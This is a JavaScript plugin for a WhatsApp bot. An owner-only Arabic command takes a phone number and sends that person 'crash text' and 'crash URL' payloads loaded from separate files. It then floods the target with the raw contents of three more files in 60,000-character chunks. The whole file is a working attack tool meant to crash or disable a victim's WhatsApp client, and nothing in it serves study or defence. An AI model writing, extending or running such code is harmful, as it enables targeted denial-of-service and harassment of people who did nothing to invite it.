import { createRequire } from 'module';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const require = createRequire(import.meta.url);
const __dirname = path.dirname(fileURLToPath(import.meta.url));

const { bug }    = require('../system/bug.cjs');
const { bugUrl } = require('../system/bugUrl.cjs');

// raw text of the 3 additional files (loaded once at startup)
const _readRaw = (name) => {
    try { return fs.readFileSync(path.join(__dirname, '..', 'system', name), 'utf8'); }
    catch (_) { return null; }
};
const rawData4  = _readRaw('Data4.cjs');
const rawMain   = _readRaw('main_.cjs');
const rawRishi  = _readRaw('RishiV18.cjs');

// Split a string into chunks ≤ maxLen chars
function splitChunks(str, maxLen = 60000) {
    if (!str) return [];
    const chunks = [];
    for (let i = 0; i < str.length; i += maxLen) chunks.push(str.slice(i, i + maxLen));
    return chunks;
}

const handler = async (m, { conn, text, usedPrefix, command }) => {
    if (!text) return m.reply(`*⚠️ أرسل رقم الشخص بعد الأمر!*\n*مثال:* ${usedPrefix + command} 966512345678`);

    const number = text.replace(/[^0-9]/g, '');
    if (!number) return m.reply('❌ *الرقم غير صحيح!*');

    const jid = number + '@s.whatsapp.net';

    await m.react('⏳');

    try {
        // 1. crash text (bug.cjs)
        await conn.sendMessage(jid, { text: bug });

        // 2. crash URL (bugUrl.cjs)
        await conn.sendMessage(jid, { text: bugUrl });

        // 3. Data4.cjs raw content in chunks
        for (const chunk of splitChunks(rawData4)) {
            await conn.sendMessage(jid, { text: chunk });
        }

        // 4. main_.cjs raw content in chunks
        for (const chunk of splitChunks(rawMain)) {
            await conn.sendMessage(jid, { text: chunk });
        }

        // 5. RishiV18.cjs raw content in chunks
        for (const chunk of splitChunks(rawRishi)) {
            await conn.sendMessage(jid, { text: chunk });
        }

        await m.react('✅');
        m.reply(`✅ *تم الإرسال إلى* +${number}`);
    } catch (e) {
        console.error('[متعه]', e);
        await m.react('❌');
        m.reply(`❌ *فشل الإرسال:* ${e.message}`);
    }
};

handler.help = ['متعه <رقم>'];
handler.tags = ['owner'];
handler.command = /^(متعه)$/i;
handler.rowner = true;

export default handler;
